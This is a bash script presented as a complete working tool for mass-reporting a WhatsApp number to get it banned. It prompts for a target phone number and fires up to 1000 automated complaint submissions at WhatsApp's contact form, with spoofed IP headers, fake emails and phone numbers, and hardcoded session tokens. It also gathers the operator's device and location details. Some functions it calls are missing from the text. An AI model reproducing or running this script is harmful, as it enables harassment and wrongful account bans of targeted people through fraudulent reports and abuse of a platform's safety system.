clear
#!/bin/bash

# WhatsApp Ultimate Reporter Pro - Complete Working Version

# Initialize colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Configuration from HTML/JS code
WHATSAPP_API_URL="https://www.whatsapp.com/contact/noclient/"
REPORT_URL="https://faq.whatsapp.com/3379690015658337/?helpref=uf_share"
LOG_FILE="whatsapp_ultimate.log"
PHONES_DB="phones.db"
IPS_DB="ips.db"
BAN_MSG_FILE="message_ban_whatsapp.json"
UNBAN_MSG_FILE="message_unban_whatsapp.json"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36"

# Parameters from HTML/JS
AJAXPIPE_TOKEN="AXjVMTl_Wz4hIrAtZA8"
COMPAT_IFRAME_TOKEN="AUUBoz_O3X_0Wosk3O9XO8rS_NY"
BRSID="7525697063073108760"
FB_LSD="AVpbkNjZYpw"
HSRP_REV="1024646339"

# Banner
clear
echo -e "${GREEN}"
echo " _    _ _   _ _   _ _____ ___  ______   __ _____ _____ _____  "
echo "| |  | | | | | \ | |_   _/ _ \|  _ \ \ / /|_   _|  ___|  ___| "
echo "| |  | | | | |  \| | | || | | | |_) \ V /   | | | |__ | |__   "
echo "| |/\| | | | | |\  | | || |_| |  _ < \ /    | | |  __||  __|  "
echo "\  /\  / |_| | | \ |_| |_\___/|_| \_\| |    |_| | |___| |___  "
echo " \/  \/ \___/|_|  \_\___/            |_|        |_|_____|_____| "
echo -e "${NC}"
echo -e "${YELLOW}WhatsApp Ultimate Reporter Pro - Complete Working Version${NC}"
echo -e "${YELLOW}=======================================================${NC}"
echo -e "Created by ${WHITE}>>LORDHOZOO👸<<${NC}  "
echo

# ==================== Device Information Functions ====================
get_device_info() {
    echo -e "${CYAN}Collecting device information...${NC}"
    
    DEVICE=$(getprop ro.product.brand 2>/dev/null || echo "Unknown")
    MODEL=$(getprop ro.product.model 2>/dev/null || echo "Unknown")
    CPU=$(getprop ro.hardware 2>/dev/null || echo "Unknown")
    RAM=$(grep "MemTotal" /proc/meminfo 2>/dev/null | awk '{print $2}' || echo "Unknown")
    SDK=$(getprop ro.build.version.sdk 2>/dev/null || echo "Unknown")
    BUILD_TIME=$(getprop ro.build.date 2>/dev/null || echo "Unknown")
    BATTERY_STATUS=$(cat /sys/class/power_supply/battery/status 2>/dev/null || echo "Unknown")
    BATTERY_CAPACITY=$(cat /sys/class/power_supply/battery/capacity 2>/dev/null || echo "Unknown")
    STORAGE_TOTAL=$(df /data 2>/dev/null | awk 'NR==2 {print $2}' || echo "Unknown")
    IP_ADDRESS=$(ip addr show wlan0 2>/dev/null | grep inet | awk '{ print $2 }' | cut -d/ -f1 || echo "Unknown")
    INTERNET_IP=$(curl -s ifconfig.me 2>/dev/null || echo "Unknown")
    LOCATION_INFO=$(curl -s "http://ipinfo.io/$INTERNET_IP" 2>/dev/null | grep -oP '"city": "\K[^"]*' || echo "Unknown Location")
    
    echo -e "${YELLOW}=== Device Information ===${NC}"
    echo -e "Device: ${WHITE}$DEVICE $MODEL${NC}"
    echo -e "IP: ${WHITE}$IP_ADDRESS${NC}"
    echo -e "Location: ${WHITE}$LOCATION_INFO${NC}"
    echo
}

# ==================== Core Functions with WhatsApp Parameters ====================
send_api_request() {
    local post_data=$1
    local random_ip=$2
    
    # Headers with parameters from WhatsApp HTML/JS
    local headers=(
        "Host: www.whatsapp.com"
        "Cookie: wa_lang_pref=ar; wa_ul=f01bc326-4a06-4e08-82d9-00b74ae8e830; wa_csrf=HVi-YVV_BloLmh-WHL8Ufz"
        "Sec-Ch-Ua-Platform: \"Linux\""
        "Accept-Language: en-US,en;q=0.9"
        "Sec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\""
        "Sec-Ch-Ua-Mobile: ?0"
        "X-Asbd-Id: 129477"
        "X-Fb-Lsd: $FB_LSD"
        "User-Agent: $USER_AGENT"
        "Content-Type: application/x-www-form-urlencoded"
        "Accept: */*"
        "Origin: https://www.whatsapp.com"
        "Sec-Fetch-Site: same-origin"
        "Sec-Fetch-Mode: cors"
        "Sec-Fetch-Dest: empty"
        "Referer: https://www.whatsapp.com/contact/noclient?"
        "Accept-Encoding: gzip, deflate, br"
        "X-Forwarded-For: $random_ip"
        "Client-IP: $random_ip"
    )
    
    # Add WhatsApp specific parameters
    local __hs="20110.BP%3Awhatsapp_www_pkg.2.0.0.0.0"
    local __s="ugvlz3%3A6skj2s%3A4yux6k"
    local __hsi=$(( RANDOM % 999999999999999999 + 1000000000000000000 ))
    local __req=$(awk -v min=0.1 -v max=10 'BEGIN{srand(); printf "%.6f\n", min+rand()*(max-min)}')
    local __a=$(( RANDOM % 1000000000 + 1 ))
    local __rev=$HSRP_REV
    local __dyn="7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa1twYwJw4BwUx60Vo1upE4W0OE3nwaq0yE1VohwnU14E9k2C0iK0D82Ixe0EUjwdq1iwmE2ewnE2Lw5XwSyES0gq0Lo6-1Fw4mwr81UU7u1rwGwbu"
    local __csr=""
    local jazoest="20000$(( RANDOM % 90000 + 10000 ))"
    
    # Append WhatsApp parameters to post data
    post_data="$post_data&__hs=$__hs&dpr=1&__ccg=UNKNOWN&__rev=$__rev&__s=$__s&__hsi=$__hsi&__dyn=$__dyn&__csr=$__csr&lsd=$FB_LSD&jazoest=$jazoest"
    
    curl -s -X POST "$WHATSAPP_API_URL" \
        -H "${headers[0]}" -H "${headers[1]}" -H "${headers[2]}" -H "${headers[3]}" \
        -H "${headers[4]}" -H "${headers[5]}" -H "${headers[6]}" -H "${headers[7]}" \
        -H "${headers[8]}" -H "${headers[9]}" -H "${headers[10]}" -H "${headers[11]}" \
        -H "${headers[12]}" -H "${headers[13]}" -H "${headers[14]}" -H "${headers[15]}" \
        -H "${headers[16]}" -H "${headers[17]}" -H "${headers[18]}" \
        --data-raw "$post_data" \
        -w "\n%{http_code}"
}

perform_attack() {
    local num_requests=$1
    local delay=$2
    local target_number=$3
    local action=$4
    
    # Load messages
    local messages=()
    while IFS= read -r line; do
        messages+=("$line")
    done < <(jq -c '.[]' "$BAN_MSG_FILE")
    
    # Countries with emphasis on Indonesia (ID)
    local countries=("ID" "ID" "ID" "EG" "US" "KR" "CN" "IN")
    local platforms=("ANDROID" "IPHONE" "WHATS_APP_WEB_DESKTOP" "KAIOS" "OTHER")
    
    for ((i=1; i<=num_requests; i++)); do
        # Get random values
        local random_phone=$(get_random_line "$PHONES_DB")
        local random_ip=$(get_random_line "$IPS_DB")
        local random_message=$(echo "${messages[$(( RANDOM % ${#messages[@]} ))]}" | jq -r '.message' | sed "s/\[###\]/$target_number/g")
        local random_subject=$(echo "${messages[$(( RANDOM % ${#messages[@]} ))]}" | jq -r '.subject')
        local country_selector=${countries[$(( RANDOM % ${#countries[@]} ))]}
        local platform=${platforms[$(( RANDOM % ${#platforms[@]} ))]}
        local email=$(generate_random_email)
        local phone_number=$(generate_random_phone "$country_selector")
        
        # Prepare data with WhatsApp parameters
        local post_data="country_selector=${country_selector}&email=${email}&email_confirm=${email}&phone_number=${phone_number}&platform=${platform}&your_message=${random_subject}%A0${random_message}&step=articles&__user=0&__a=$(( RANDOM % 1000000000 + 1 ))&__req=$(awk -v min=0.1 -v max=10 'BEGIN{srand(); printf "%.6f\n", min+rand()*(max-min)}')"
        
        # Send request
        local response=$(send_api_request "$post_data" "$random_ip")
        local http_code=$(echo "$response" | tail -n1)
        
        # Log and display
        if [ "$http_code" -eq 200 ]; then
            echo -e "${GREEN}Success: ${WHITE}Request $i - Target: $target_number - From: $random_ip${NC}"
        else
            echo -e "${RED}Failed: ${WHITE}Request $i - Status: $http_code${NC}"
        fi
        
        # Send report URL periodically
        if (( i % 5 == 0 )); then
            send_report_url "$target_number"
        fi
        
        sleep $delay
    done
}

# ==================== Main Execution ====================
main() {
    get_device_info
    
    # Get target number
    while true; do
        echo -e "${CYAN}Enter target phone number (e.g. +628123456789): ${NC}"
        read -r target_number
        [[ $target_number =~ ^\+[0-9]{10,15}$ ]] && break
        echo -e "${RED}Invalid format. Example: +628123456789${NC}"
    done
    
    # Get action
    while true; do
        echo -e "${CYAN}Action (ban/unban): ${NC}"
        read -r action
        [[ "$action" =~ ^(ban|unban)$ ]] && break
        echo -e "${RED}Enter 'ban' or 'unban'${NC}"
    done
    
    # Get requests count
    while true; do
        echo -e "${CYAN}Number of requests (1-1000): ${NC}"
        read -r num_requests
        [[ $num_requests =~ ^[0-9]+$ && $num_requests -gt 0 && $num_requests -le 1000 ]] && break
        echo -e "${RED}Enter number 1-1000${NC}"
    done
    
    # Get delay
    while true; do
        echo -e "${CYAN}Delay between requests (seconds): ${NC}"
        read -r delay
        [[ $delay =~ ^[0-9]+$ && $delay -ge 1 && $delay -le 60 ]] && break
        echo -e "${RED}Enter 1-60 seconds${NC}"
    done
    
    # Confirm
    echo -e "${YELLOW}Confirm attack on $target_number - $num_requests requests - $delay seconds delay${NC}"
    read -p "Proceed? (y/n): " -n 1 -r
    [[ $REPLY =~ ^[Yy]$ ]] || exit 0
    
    # Execute
    perform_attack "$num_requests" "$delay" "$target_number" "$action"
    echo -e "${GREEN}Attack completed. Check $LOG_FILE for details.${NC}"
}

# Run
main
